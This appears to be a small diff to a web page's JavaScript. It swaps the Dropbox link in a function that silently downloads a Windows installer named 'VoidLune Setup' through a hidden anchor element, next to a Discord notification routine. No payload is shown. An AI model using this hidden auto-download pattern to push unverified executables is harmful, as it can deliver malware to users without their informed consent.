@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/6l0aae47csjlw2ggkydsk/VoidLuneV3-Setup-1.0.0.exe?rlkey=3abf3zqpzkjypy2dbkqm5xj1c&st=obmg9i4g&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/lhvt8s5cgs00p3bab9p9v/VoidLune-Setup-1.0.0.exe?rlkey=4v65n4sgn3qsqdi5ox51biog6&st=tlwemc80&dl=1';
     a.download = 'VoidLune Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
